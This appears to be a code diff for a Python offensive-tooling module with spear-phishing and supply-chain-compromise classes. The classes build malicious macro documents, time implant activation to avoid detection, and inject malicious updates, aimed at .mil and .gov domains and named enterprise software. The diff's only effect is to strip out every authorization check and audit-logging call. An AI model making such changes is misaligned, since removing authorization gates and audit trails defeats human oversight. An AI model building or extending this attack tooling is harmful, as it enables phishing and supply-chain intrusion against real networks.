@@ -12,7 +12,6 @@ import tempfile
 from typing import List, Dict, Any
 from datetime import datetime
 
-from .security_controls import require_authorization, safe_mode, audit_action
 from .exploit_intel import enrich_with_exploit_intel
 
 
@@ -36,7 +35,6 @@ class SpearPhishingGenerator:
             "Immediate Action: Software Patch Deployment"
         ]
     
-    @require_authorization
     def generate_email(self, target_domain: str = None, include_payload: bool = True) -> Dict[str, Any]:
         """Generate a spear-phishing email with optional payload."""
         domain = target_domain or random.choice(self.target_domains)
@@ -54,12 +52,6 @@ class SpearPhishingGenerator:
         if include_payload:
             email["macro_content"] = self._generate_malicious_macro()
             email["payload_file"] = self._create_malicious_document()
-        
-        audit_action("spear_phishing_generated", {
-            "target_domain": domain,
-            "subject": subject,
-            "include_payload": include_payload
-        })
         
         clean_domain = domain.replace("@", "")
         search_terms = [clean_domain, subject, "macro", "phishing"]
@@ -92,7 +84,6 @@ End Sub'''
         
         return macro_template
     
-    @require_authorization
     def _create_malicious_document(self) -> str:
         """Create a malicious document file with embedded macro."""
         # Create temporary file for malicious document
@@ -107,7 +98,6 @@ End Sub'''
         
         return doc_path
     
-    @require_authorization
     def send_phishing_email(self, target_email: str, email_content: Dict[str, Any]) -> Dict[str, Any]:
         """Simulate sending a phishing email (placeholder for real implementation)."""
         result = {
@@ -117,12 +107,6 @@ End Sub'''
             "email_subject": email_content["subject"],
             "attachment_sent": email_content.get("malicious_attachment") is not None
         }
-        
-        audit_action("phishing_email_sent", {
-            "target_email": target_email,
-            "subject": email_content["subject"],
-            "attachment": email_content.get("malicious_attachment")
-        })
         
         return result
 
@@ -134,7 +118,6 @@ class SupplyChainCompromise:
         self.american_networks = ["mil", "gov", "usmc.mil", "army.mil", "navy.mil"]
         self.target_software = ["Orion", "SolarWinds", "Pulse Secure", "Exchange", "SharePoint"]
     
-    @require_authorization
     def malicious_update_check(self, target_ip: str, target_domain: str) -> Dict[str, Any]:
         """Check if conditions are right for malicious update activation."""
         current_hour = datetime.now().hour
@@ -162,7 +145,6 @@ class SupplyChainCompromise:
             # Still avoid noisy actions on non-government networks during the day
             result["sleep_duration"] = 3600 * 8  # 8 hours
 
-        audit_action("malicious_update_check", result)
         search_terms = [
             target_domain,
             "supply chain",
@@ -176,7 +158,6 @@ class SupplyChainCompromise:
             include_payloads=True,
         )
     
-    @require_authorization
     def execute_implant(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
         """Execute implant based on target information."""
         if target_info["should_activate"]:
@@ -200,7 +181,6 @@ class SupplyChainCompromise:
                 "sleep_duration": target_info.get("sleep_duration", 0)
             }
         
-        audit_action("implant_executed", result)
         return enrich_with_exploit_intel(
             "persistence",
             result,
@@ -219,7 +199,6 @@ class SupplyChainCompromise:
         # 4. Clean up traces
         pass
     
-    @require_authorization
     def inject_malicious_update(self, software_name: str, update_server: str) -> Dict[str, Any]:
         """Inject malicious code into software update process."""
         result = {
@@ -231,7 +210,6 @@ class SupplyChainCompromise:
             "estimated_victims": "1000+"
         }
         
-        audit_action("malicious_update_injected", result)
         return enrich_with_exploit_intel(
             "initial-access",
             result,
